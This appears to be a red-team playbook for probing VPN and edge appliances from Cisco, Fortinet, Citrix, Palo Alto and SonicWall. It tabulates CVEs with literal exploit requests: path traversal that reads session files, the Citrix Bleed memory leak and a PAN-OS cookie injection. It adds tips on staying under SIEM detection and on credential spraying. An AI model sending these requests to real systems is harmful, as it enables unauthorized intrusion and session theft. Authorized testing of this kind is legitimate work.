## Historical CVE leads: not verified applicability
## CVE matrix: pre-auth or auth-bypass (2018-2026)
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal; info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal; file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team; disruptive** |
# Cisco CVE-2020-3452: file read
# Cisco CVE-2018-0296: path traversal
# /+CSCOE+/portal_inc.lua    (portal inclusions: may reveal local users)
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal; sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow; pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow; pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write; pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
# Fortinet CVE-2018-13379: most reliably-fingerprintable file read
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header; long Host header triggers memory leak in response |
# If response is large (>10KB) and contains random memory contents: vulnerable
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection; pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |
# CVE-2019-11510: Pulse file read
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection; pre-auth | nuclei template available |
## Default credentials (test sparingly: lockout risk)
- **Banner-stripped servers (no version disclosure)** are good defense-in-depth; record as positive finding even if no CVE found
- **Rate-limit yourself**; these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata may be public**; access it only within authorized scope; redact internal identifiers in reports.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK**; accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification**; knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.
- `m365-entra-attack`; when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml`; XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection`; appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset`; banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints
- **Don't conclude "patched" from a 404 on one CVE path**; patches deploy unevenly; compare exact build/configuration and vendor evidence; do not mandate extra exploit attempts
- **Don't trust the version banner alone**; appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting**; these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately**; start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata**; even when the appliance is patched, SAML SP misconfig is its own attack surface